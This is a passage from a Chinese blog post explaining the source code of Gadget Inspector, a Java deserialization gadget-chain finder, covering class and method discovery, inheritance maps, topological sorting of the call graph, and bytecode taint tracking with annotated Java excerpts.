class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>当类的所有字段和方法都被访问完毕后，visitEnd 方法会被调用，表示类访问的结束。<br>该方法将已经访问的类信息封装为ClassReference对象存储在 discoveredClasses 变量中，用于标识已经被访问过的类。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitEnd</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">ClassReference</span> <span class="variable">classReference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReference</span>(</span><br><span class="line">                    name,</span><br><span class="line">                    superName,</span><br><span class="line">                    interfaces,</span><br><span class="line">                    isInterface,</span><br><span class="line">                    members.toArray(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Member[members.size()]));</span><br><span class="line">            discoveredClasses.add(classReference);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.visitEnd();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>上述四个方法调用完毕后，我们便可通过 MethodDiscovery 对象的 discoveredClasses 以及 discoveredMethods 变量获取到当前类中所有字段以及方法信息。<br>为了方便后续过程使用这一步生成的信息，Gadget Inspector 调用 MethodDiscovery 的 save 方法将这些信息保存到本地文件中分别为 classes.dat 以及 methods.dat<br>用以存储类信息以及方法信息。<br>classes.dat的数据存储结构为：<br>全类名|父类名|接口列表|是否是接口|成员列表<br>methods.dat的数据存储结构为：<br>所属类全类名|方法名|方法描述符|是否是静态方法<br>类基本信息存储完毕后 Gadget Inspector 将利用 discoveredClasses 变量中存储的类信息计算类的继承树并将其存储到 inheritanceMap.dat 文件中。<br>首先从 ClassReference 对象中获取父类以及接口信息，再从classMap中获取到当前类的父类与接口的 ClassReference 对象，最后进行递归调用，获得基类的所有<br>父类以及接口。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">getAllParents</span><span class="params">(ClassReference classReference, Map&lt;ClassReference.Handle, ClassReference&gt; classMap, Set&lt;ClassReference.Handle&gt; allParents)</span> &#123;</span><br><span class="line">        Set&lt;ClassReference.Handle&gt; parents = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (classReference.getSuperClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">        parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(classReference.getSuperClass()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (String iface : classReference.getInterfaces()) &#123;</span><br><span class="line">        parents.add(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(iface));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle immediateParent : parents) &#123;</span><br><span class="line">        <span class="type">ClassReference</span> <span class="variable">parentClassReference</span> <span class="operator">=</span> classMap.get(immediateParent);</span><br><span class="line">        <span class="keyword">if</span> (parentClassReference == <span class="literal">null</span>) &#123;</span><br><span class="line">        LOGGER.debug(<span class="string">&quot;No class id for &quot;</span> + immediateParent.getName());</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        allParents.add(parentClassReference.getHandle());</span><br><span class="line">        getAllParents(parentClassReference, classMap, allParents);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>最终 inheritanceMap.dat 的数据存储结构为：<br>当前类全类名|父类以及接口列表  </p>
<h4 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h4><p>数据流分析是 Gadget Inspector 中最核心的模块，其目的是对数据流进行传播分析，从而确定方法入参与返回值的关系。数据流分析整体上分为3步，即构造方法调用图、<br>对所有方法进行逆拓扑排序、计算数据传播流图。  </p>
<h5 id="分析方法调用关系"><a href="#分析方法调用关系" class="headerlink" title="分析方法调用关系"></a>分析方法调用关系</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">        passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">                config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>方法调用图的构造只是简单得使用 MethodCallDiscoveryClassVisitor 这个 ClassVisitor 通过对其重写的 visitMethod 方法进行调用时通过引入<br>MethodCallDiscoveryMethodVisitor 这个  MehtodVisitor，通过其 visitMethodInsn 方法的调用从而记录当前类的每一个方法在用过程中发起了哪些其他的方法调用。<br>visitMethodInsn 方法监听的方法调用类型包括 INVOKEVIRTUAL、INVOKESPECIAL、INVOKESTATIC、INVOKEINTERFACE，<br>即实例方法调用、（构造函数，私有方法，父类方法）、静态方法调用、接口方法调用。   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;</span><br><span class="line">            calledMethods.add(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc));</span><br><span class="line">            <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这些方法调用最终会被记录到 methodCalls 变量中并通过对应的方法句柄进行索引。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span><br><span class="line"><span class="params">                                           <span class="keyword">final</span> String owner, String name, String desc)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(api, mv);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">this</span>.calledMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            methodCalls.put(<span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc), calledMethods);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h5 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h5><p>在了解Gadget Inspector 的逆拓扑排序方法之前，我们首先需要了解以下什么是拓扑排序，当前情境下为什么需要拓扑排序。  </p>
<h6 id="图相关概念"><a href="#图相关概念" class="headerlink" title="图相关概念"></a>图相关概念</h6><p>假设存在一个二元组 G &#x3D; (V, E)，其中V是一系列点的集合，E是一系列边的集合，其中V &#x3D; {v1, v2, v3, v4, v5}，E &#x3D; {(v1, v2), (v2, v3), (v3, v4), (v4, v5), (v5, v1)}，那么G就是一个图。<br>我们将V中的某一个点称为这个图的顶点，与该顶点相关联的边的条数称为该顶点的度，例如：在图G中，与顶点 v1 相关的边为(v1, v2) 和 (v5, v1)，故其度为2。<br>度又分为入度与出度，一个顶点的入度指的是以该顶点为终点的边数，出度指的是以该顶点为起点的边数，故顶点 V1 的入度与出度均为1。<br>在图G中，每一条边均是有方向的，被记作(u, v)，故称图G是一个有向图。在一个图中一系列相互连接的边被称为一条途径，若边两两不同则被称为一条迹，若点也两两不同，则被称为一条路径。<br>对于一条迹，如果其起点与终点一致，那么该迹称为一条回路。对于一条回路，如果其起点与终点是唯一相同的点，则称该回路是一个环。<br>所谓有向无环图则必须满足两个条件，其一该图是一个有向图；其二该图不存在环。<br>有向无环图存在两个性质，其一能进行拓扑排序的图，一定是有向无环图；其二有向无环图一定能进行拓扑排序。  </p>
<h6 id="为什么需要将所有方法进行拓扑排序"><a href="#为什么需要将所有方法进行拓扑排序" class="headerlink" title="为什么需要将所有方法进行拓扑排序"></a>为什么需要将所有方法进行拓扑排序</h6><p>拓扑排序的目标是将所有节点排序，使得排在前面的节点不能依赖于排在后面的节点。<br>在本项目中，我们需要求解的是方法的参数与返回值的关系，而一个方法调用中可能存在另外一个方法调用，该方法可能会接受外层方法的参数同时其返回值可能会影响外层方法的局部变量，<br>而该局部变量又可能会影响外层方法的返回值， 故我们在对外层方法的入参与返回值的关系进行求解时需要先对内层被调用方法的入参与返回值的关系进行求解。<br>在下面的例子中，我们如果需要判断方法a的参数arg会不会污染其返回值。因为返回值br来自于方法b的执行结果，故我们需要先判断方法b的入参arg2会不会污染其返回值。<br>在方法b中因为形参arg2会污染方法b的返回值，故在方法a中arg1作为方法b的实参被传入，故br会被arg1污染，即方法a的返回值会被方法a的参数arg1污染。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">a</span><span class="params">(String arg1)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">br</span> <span class="operator">=</span> b(arg1);</span><br><span class="line">        <span class="keyword">return</span> br;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">b</span><span class="params">(String arg2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> arg2 + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以将不同的方法看作不同的点，所有的方法构成一个点集，将方法的调用关系看作边，调用者作为起点，被调用者作为终点从而形成一个有向的边集形成一个有向图。<br>因为 Java 方法调用的特殊性，其往往存在各种循环调用，典型的就是递归调用，故方法调用图并不是一个典型的有向无环图。一般来说这样的图是不能进行拓扑排序的，<br>不过 Gadget Inspector 通过引入中间变量并增加逻辑判断的方式来避免了这个问题。  </p>
<h6 id="如何对方法调用进行拓扑排序"><a href="#如何对方法调用进行拓扑排序" class="headerlink" title="如何对方法调用进行拓扑排序"></a>如何对方法调用进行拓扑排序</h6><p>在前一节中通过 discoverMethodCalls 方法的调用获取了一个以 MethodReference.Handle 方法句柄为Key，Set&lt;MethodReference.Handle&gt; 为值的一个Map并赋值给变量methodCalls。<br>在进行拓扑排序是首先将methodCalls变量的值进行拷贝到 outgoingReferences 中，然后定义了三个变量 dfsStack，visitNodes，sortedMethods<br>分别用于记录搜索栈，已访问节点集合，以及最终的排序结果集合。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">            MethodReference.<span class="type">Handle</span> <span class="variable">method</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            outgoingReferences.put(method, <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Topological sort methods</span></span><br><span class="line">        LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(outgoingReferences.size());</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">        &#125;</span><br><span class="line">        LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sortedMethods;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>stack 变量是用来跟踪方法调用深度的栈，每当发生方法调用时便将该方法压入到栈中，当方法调用结束时将该方法从栈中弹出，当栈为空时表示一次排序结束。<br>visitedNodes 变量用于表示当前节点已经被访问过了，当某个节点出现在visitedNotes中时将不必继续进行递归而是直接返回，因为该节点已经被排序存储到 sortedMethods 中。<br>通过 visitedNodes 集合的引入，Gadget Inspector 有效地避免了有向图拓扑排序过程中环的问题。<br>sortedMethods 存储最终的排序结果，所有的方法都将被存储在该列表中。<br>在整个排序过程中 stack 变量可能为空，因为其只存储了一次方法调用排序的堆栈变化关系，当当前方法调用结束后 stack 变量为空，则表示一次排序结束。<br>visitedNodes 过程中不会为空而是不断地增长，因为其存储的是所有被访问过的方法，随着排序的进行其容量会不断扩大。sortedMethods 列表会随着排序的进行增长，因为其存储的是排序的结果。<br>visitedNodes 集合的引入是为了处理有向图中出现的环的问题。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span><br><span class="line"><span class="params">                                    List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span><br><span class="line"><span class="params">                                    Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">        <span class="keyword">if</span> (outgoingRefs == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        stack.add(node);</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;</span><br><span class="line">            dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">        &#125;</span><br><span class="line">        stack.remove(node);</span><br><span class="line">        visitedNodes.add(node);</span><br><span class="line">        sortedMethods.add(node);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h5 id="构造数据传播流图"><a href="#构造数据传播流图" class="headerlink" title="构造数据传播流图"></a>构造数据传播流图</h5><p>本节是 Gadget Inspector 的精华，它通过静态模拟程序运行过程中局部变量表以及操作数栈的变换来进行污点分析，从而确认方法入参与返回值之间的关系。<br>在下面的方法中首先对 <clinit> 方法做了排除，因为它是类的构造方法，在类的加载过程中由JVM执行，负责类静态代码块的执行以及类成员变量的初始化等操作。<br>该过程不受攻击者控制。<br>然后通过方法句柄获取到其所属类并读取该类的字节码流，并使用 PassthroughDataflowClassVisitor 对字节码流进行解析。 PassthroughDataflowClassVisitor 是一个 ClassVisitor，<br>其 visitMethod 会依次处理该类的所有方法，并使用 MethodVisitor 对方法进行解析。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; calculatePassthroughDataflow(Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName,</span><br><span class="line">                                                                                          Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span><br><span class="line">                                                                                          InheritanceMap inheritanceMap,</span><br><span class="line">                                                                                          List&lt;MethodReference.Handle&gt; sortedMethods,</span><br><span class="line">                                                                                          SerializableDecider serializableDecider) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : sortedMethods) &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;&lt;clinit&gt;&quot;</span>)) &#123; </span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ClassResourceEnumerator.<span class="type">ClassResource</span> <span class="variable">classResource</span> <span class="operator">=</span> classResourceByName.get(method.getClassReference().getName());</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> classResource.getInputStream()) &#123;</span><br><span class="line">                <span class="type">ClassReader</span> <span class="variable">cr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(inputStream);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">PassthroughDataflowClassVisitor</span> <span class="variable">cv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PassthroughDataflowClassVisitor</span>(classMap, inheritanceMap,</span><br><span class="line">                            passthroughDataflow, serializableDecider, Opcodes.ASM6, method);</span><br><span class="line">                    cr.accept(cv, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                     passthroughDataflow.put(method, cv.getReturnTaint());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    LOGGER.error(<span class="string">&quot;Exception analyzing &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Unable to analyze &quot;</span> + method.getClassReference().getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> passthroughDataflow;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor 是一个 MethodVisitor，其会访问一个方法调用的各种信息。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> MethodVisitor <span class="title function_">visitMethod</span><span class="params">(<span class="type">int</span> access, String name, String desc,</span></span><br><span class="line"><span class="params">        String signature, String[] exceptions)</span> &#123;</span><br><span class="line">        <span class="comment">// 访问指定的方法   方法名与方法描述符必须一致  避免方法重载带来的冲突</span></span><br><span class="line">        <span class="keyword">if</span> (!name.equals(methodToVisit.getName()) || !desc.equals(methodToVisit.getDesc())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (passthroughDataflowMethodVisitor != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Constructing passthroughDataflowMethodVisitor twice!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MethodVisitor</span> <span class="variable">mv</span> <span class="operator">=</span> <span class="built_in">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">        <span class="comment">// 访问类的某一个方法的详细信息</span></span><br><span class="line">        passthroughDataflowMethodVisitor = <span class="keyword">new</span> <span class="title class_">PassthroughDataflowMethodVisitor</span>(</span><br><span class="line">        classMap, inheritanceMap, <span class="built_in">this</span>.passthroughDataflow, serializableDecider,</span><br><span class="line">        api, mv, <span class="built_in">this</span>.name, access, name, desc, signature, exceptions);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JSRInlinerAdapter</span>(passthroughDataflowMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor 继承自 TaintTrackingMethodVisitor 两者一同实现了操作数栈以及局部变量表的静态模拟。<br>PassthroughDataflowMethodVisitor 主要负责污点传播分析， TaintTrackingMethodVisitor 主要负责在分析过程中调整操作数栈以及局部变量表。<br>在 MethodVisitor 中针对字节码不同的行为均有相应的方法进行处理，如当方法中出现无操作数字节码调用时，如：RETURN, IRETURN, ATHROW，将会触发 visitInsn 方法调用，<br>当出现方法调用指令时，如： INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC, INVOKEINTERFACE ，将触发 visitMethodInsn 方法调用。<br>Gadget Inspector 将在对应的方法中同步记录这些指令调用时操作数栈以及局部变量表的变化情况。<br>下面我们将通过几个方法的调用举例展示，Gadget Inspector 时如何进行模拟的。  </p>
<p>visitCode 方法是最先被执行的方法，其将负责局部变量表空间的开辟，并设置相应的污点。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// 开辟局部变量表空间</span></span><br><span class="line">            <span class="built_in">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">localIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// 设置污点  也可以理解成设置形参在局部变量表中的位置 形成的数据类似</span></span><br><span class="line">            <span class="comment">// 假如有这样一个实例方法</span></span><br><span class="line">            <span class="comment">// (String,long,int)</span></span><br><span class="line">            <span class="comment">// 对应的局部变量表为 long 的索引为2 占据两个槽位</span></span><br><span class="line">            <span class="comment">// | 0 | 1 | 2 |   | 3 |</span></span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 第0个局部变量被第0个参数污染</span></span><br><span class="line">                setLocalTaint(localIndex, argIndex);</span><br><span class="line">                localIndex += <span class="number">1</span>;</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 依次类推 设置参数的污染 根据参数的类型调整局部变量表索引，因为 long Double 类型占据两个槽位</span></span><br><span class="line">            <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">                setLocalTaint(localIndex, argIndex);</span><br><span class="line">                localIndex += argType.getSize();</span><br><span class="line">                argIndex += <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>PassthroughDataflowMethodVisitor 父类 TaintTrackingMethodVisitor 的 visitCode 方法，主要作用是开辟局部变量表空间。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.visitCode();</span><br><span class="line">        savedVariableState.localVars.clear();</span><br><span class="line">        savedVariableState.stackVars.clear();</span><br><span class="line">        <span class="comment">// 方法的访问修饰符部位 static  为局部变量表开辟一个空间 因为实例方法第一个参数为this, 占据一个槽位</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">            savedVariableState.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 根据方法描述符获取到参数类型 不同的参数类型占据不同的槽位 一般的类型为1个槽位  long double 占据两个槽位</span></span><br><span class="line">        <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">            <span class="comment">// 根据参数类型开辟不同大小的空间</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argType.getSize(); i++) &#123;</span><br><span class="line">                savedVariableState.localVars.add(<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;T&gt;());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当方法中出现字段访问时会调用 visitFieldInsn 方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitFieldInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">                <span class="comment">// 静态的操作不了</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Opcodes.PUTSTATIC:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="comment">// 从字段取值</span></span><br><span class="line">                <span class="keyword">case</span> Opcodes.GETFIELD:</span><br><span class="line">                    <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc);</span><br><span class="line">                    <span class="comment">// 占据一个槽位的字段</span></span><br><span class="line">                    <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                        <span class="comment">// 判断字段是否能实例化 经典java序列化的条件 是 实现了serialize接口且类型没有在黑名单中</span></span><br><span class="line">                        <span class="comment">// 如果不能被序列化 则 isTransient 标记为true</span></span><br><span class="line">                        <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                            isTransient = Boolean.TRUE;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                            <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                                <span class="comment">// 获取当前字段所属类 的所有成员变量 进行遍历</span></span><br><span class="line">                                <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                                    <span class="comment">// 如果当前字段所属类的成员变量与当前字段相等</span></span><br><span class="line">                                    <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                        <span class="comment">// 如果当前字段是被transient修饰 则被标记为   isTransient</span></span><br><span class="line">                                        isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">break</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    <span class="keyword">break</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="comment">// 父类也要被找一遍 多态的原因</span></span><br><span class="line">                                clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        Set&lt;Integer&gt; taint;</span><br><span class="line">                        <span class="comment">// 字段如果不是瞬态的 需要从栈上去一个值</span></span><br><span class="line">                        <span class="comment">// getField 会先从栈顶取出对象的引用</span></span><br><span class="line">                        <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                            taint = getStackTaint(<span class="number">0</span>); <span class="comment">// 只取不删</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 字段如果是瞬态的 虽然也需要从栈上取对象的引用 但并不会产生污点 只需设置一个空集合即可</span></span><br><span class="line">                            <span class="comment">// 或者说 污点传播链被中断了</span></span><br><span class="line">                            taint = <span 